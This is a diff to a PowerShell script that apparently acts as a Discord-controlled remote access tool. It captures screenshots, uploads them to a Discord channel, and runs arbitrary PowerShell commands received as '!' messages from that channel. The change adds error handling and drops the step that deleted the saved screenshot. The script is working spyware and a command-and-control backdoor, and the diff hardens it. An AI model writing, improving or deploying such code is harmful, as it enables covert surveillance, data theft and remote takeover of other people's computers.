@@ -45,14 +45,19 @@ function Capture-Screenshot {
         [string]$filePath = "$env:TEMP\screenshot.png"
     )
 
-    Add-Type -AssemblyName System.Drawing
-    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
-    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    try {
+        Add-Type -AssemblyName System.Drawing
+        $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+        $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    Write-Host "Screenshot saved to $filePath"
-    return $filePath
+        Write-Host "Screenshot saved to $filePath"
+        return $filePath
+    } catch {
+        Write-Host "Error capturing screenshot: $_"
+        return $null
+    }
 }
 
 # Function to send an image file to Discord
@@ -61,19 +66,24 @@ function Send-DiscordImage {
         [string]$filePath
     )
 
+    if (-not (Test-Path $filePath)) {
+        Write-Host "Screenshot file not found at $filePath"
+        return
+    }
+
     # Read the file into a byte array
-    $fileStream = [System.IO.File]::OpenRead($filePath)
-    $fileName = [System.IO.Path]::GetFileName($filePath)
-
-    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
-    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-    $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::Parse("form-data; name=`"file`"; filename=`"$fileName`"")
-    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-
-    $multipartContent.Add($fileContent, "file", $fileName)
-
-    # Send the POST request to Discord with the image
     try {
+        $fileStream = [System.IO.File]::OpenRead($filePath)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+
+        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::Parse("form-data; name=`"file`"; filename=`"$fileName`"")
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
+
+        $multipartContent.Add($fileContent, "file", $fileName)
+
+        # Send the POST request to Discord with the image
         $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $multipartContent).Result
         if ($response.IsSuccessStatusCode) {
             Write-Host "Image sent successfully."
@@ -87,17 +97,14 @@ function Send-DiscordImage {
     }
 }
 
-# Function to capture a screenshot, send it, and then delete only the screenshot file
+# Function to capture a screenshot and send it to Discord
 function CaptureAndSendScreenshot {
     $filePath = Capture-Screenshot  # Capture screenshot and get the file path
-    Send-DiscordImage -filePath $filePath  # Send the image to Discord
 
-    # Clean up by deleting only the screenshot after sending
-    try {
-        Remove-Item -Path $filePath -Force  # Delete only the screenshot file
-        Write-Host "Screenshot file deleted from $filePath"
-    } catch {
-        Write-Host "Error deleting screenshot file: $_"
+    if ($filePath) {
+        Send-DiscordImage -filePath $filePath  # Send the image to Discord
+    } else {
+        Write-Host "Screenshot capture failed, no file to send."
     }
 }
 
@@ -172,7 +179,7 @@ while ($true) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
 
                     if ($command -eq "screenshot") {
-                        CaptureAndSendScreenshot  # Capture, send, and delete the screenshot
+                        CaptureAndSendScreenshot  # Capture and send the screenshot
                     } else {
                         Execute-PowerShellCommand -command $command
                     }
